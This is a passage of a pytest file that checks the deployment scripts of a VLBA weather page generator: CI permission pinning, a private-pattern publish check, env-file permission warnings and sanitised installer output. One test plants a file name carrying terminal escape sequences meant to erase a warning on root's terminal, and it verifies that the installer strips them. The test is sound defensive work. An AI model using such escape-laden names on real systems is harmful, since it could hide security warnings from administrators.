    assert not td._gen_pids(tmp / "gen.pids"), "no generator run may start"


@pytest.fixture
def local_env(tmp_path):
    """run_local.sh's environment with a stub python3 whose generator runs record their pid."""
    stub_dir = tmp_path / "stub"
    stub_dir.mkdir()
    stub = stub_dir / "python3"
    stub.write_text('#!/bin/bash\nif [ "$1" = "./make_vlba_page.py" ]; then echo $$ >> "$STUB_PIDS";'
                    ' exec sleep 60; fi\nexec %s "$@"\n' % sys.executable)
    stub.chmod(0o755)
    env = {k: v for k, v in os.environ.items() if not k.startswith(("WEATHER_", "VLBA_"))}
    env.update(PATH=str(stub_dir) + os.pathsep + env.get("PATH", ""),
               STUB_PIDS=str(tmp_path / "gen.pids"), BIND="127.0.0.1",
               WEATHER_CACHE_DIR=str(tmp_path / "cache"))
    return env, tmp_path


# ---- 1.8: CI -----------------------------------------------------------------------------------------
def test_ci_token_is_read_only_and_actions_are_pinned():
    ci = td._read(".github", "workflows", "ci.yml")
    assert re.search(r"^permissions:\n  contents: read$", ci, re.M)
    uses = re.findall(r"^\s*- uses: (\S+)(.*)$", ci, re.M)
    assert len(uses) == 2
    for ref, comment in uses:
        assert re.match(r"^actions/[a-z-]+@[0-9a-f]{40}$", ref), ref
        assert re.match(r"^\s+# v\d+$", comment), comment
    assert re.search(r"pip install .*\bnetCDF4\b", ci)


# ---- #51 / #146: the publish check ----------------------------------------------------------------
def test_private_patterns_named_but_unreadable_fails(tmp_path):
    with pytest.raises(pytest.fail.Exception):
        td._private_patterns(str(tmp_path / "typo"), named=True)
    assert td._private_patterns(str(tmp_path / "absent"), named=False) is None
    f = tmp_path / "patterns"
    f.write_text("# a comment\nexample-internal-host\n")
    assert [p.pattern for p in td._private_patterns(str(f), named=True)] == ["example-internal-host"]


def test_publish_check_reports_skipped_or_failed_never_a_silent_pass(tmp_path):
    def run(**env):
        e = dict(os.environ, PYTHONDONTWRITEBYTECODE="1", **env)
        r = subprocess.run([sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider",
                            "vlba/tests/test_deploy.py::test_published_files_have_no_private_hosts_paths_or_addresses"],
                           cwd=ROOT, env=e, capture_output=True, text=True, timeout=300)
        return r.stdout + r.stderr
    assert "1 failed" in run(LWA_PRIVATE_PATTERNS=str(tmp_path / "typo"))
    if not os.path.exists(os.path.join(ROOT, ".private-patterns")):
        assert "1 skipped" in run(LWA_PRIVATE_PATTERNS="")


# ---- review: the installer says when the wrapper will skip an env file (#35) --------------------
@needs_user
def test_cron_installer_warns_about_an_env_file_the_wrapper_skips(tmp_path):
    """The wrapper now skips an env file that it, its link target or their directories let
    group or others write (a home file saved under umask 002, say). The installer says so,
    with the same rule, instead of leaving it to a line in the cron log."""
    envf = tmp_path / "home.env"
    envf.write_text("WEATHER_TITLE=x\n")
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "in.env").write_text("WEATHER_TITLE=y\n")
    (shared / "in.env").chmod(0o644)
    link = tmp_path / "link.env"
    link.symlink_to(shared / "in.env")
    for mode, dmode, warned in ((0o644, 0o755, False), (0o600, 0o755, False),
                                (0o664, 0o755, True), (0o644, 0o777, True)):
        envf.chmod(mode)
        shared.chmod(dmode)
        target = envf if dmode == 0o755 else link
        r, _, _ = _install(tmp_path, "install-cron.sh", str(tmp_path / "www"),
                           CACHE_DIR=str(tmp_path / "cache"), ENV_FILES=str(target))
        shared.chmod(0o755)
        assert r.returncode == 0, r.stdout + r.stderr
        assert ("WARNING: the cron wrapper skips the env file %s" % target in r.stderr) is warned, \
            (oct(mode), oct(dmode), r.stderr)
    # the wrapper's own verdict on the same files agrees
    envf.chmod(0o664)
    for f, dmode, skipped in ((envf, 0o755, True), (link, 0o777, True), (link, 0o755, False)):
        shared.chmod(dmode)
        env = td._wrapper_env(tmp_path, ENV_FILES=str(f))
        r = subprocess.run(["sh", WRAPPER], env=env, cwd=str(tmp_path), capture_output=True,
                           text=True, timeout=60)
        shared.chmod(0o755)
        assert ("skipped the env file %s" % f in r.stdout) is skipped, r.stdout


@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_checkout_warning_cannot_be_erased_by_a_file_name(tmp_path, script):
    """Whoever can write deploy/ chooses the names listed in the #31 warning: a name with
    terminal escapes (cursor up, erase line) must not reach root's terminal raw, or it could
    wipe the very warning that names it."""
    copy = tmp_path / "checkout"
    shutil.copytree(DEPLOY, str(copy / "deploy"))
    shutil.copytree(os.path.join(ROOT, "weather"), str(copy / "weather"),
                    ignore=shutil.ignore_patterns("tests", "__pycache__"))
    shutil.copy2(os.path.join(ROOT, "make_vlba_page.py"), str(copy / "make_vlba_page.py"))
    evil = copy / "deploy" / "x\r\x1b[2K\x1b[1Ay"
    evil.write_text("")
    evil.chmod(0o666)
    bindir = _stubbin(tmp_path)
    e = dict(os.environ, DRY_RUN="1", RUN_USER=ME, PATH="%s:%s" % (bindir, os.environ["PATH"]),
             ENV_FILES=str(tmp_path / "absent.env"), SYSTEM_ENV_FILE=str(tmp_path / "absent-system.env"),
             GENTOO_DOCROOT=str(tmp_path / "no-htdocs"), CACHE_DIR=str(tmp_path / "cache"))
    e.pop("SUDO_USER", None)
    r = subprocess.run(["bash", str(copy / "deploy" / script), str(tmp_path / "www")], env=e,
                       capture_output=True, text=True, cwd=str(tmp_path), timeout=120)
    m = re.search(r"(?:preview files|rendered files) go to (\S+)", r.stdout)
    if m:
        shutil.rmtree(m.group(1), ignore_errors=True)
    assert r.returncode == 0, r.stderr
    assert "%s/deploy/x[2K[1Ay (owner %s, mode 666)" % (copy, ME) in r.stderr, r.stderr
    assert "\x1b" not in r.stderr and "\r" not in r.stderr
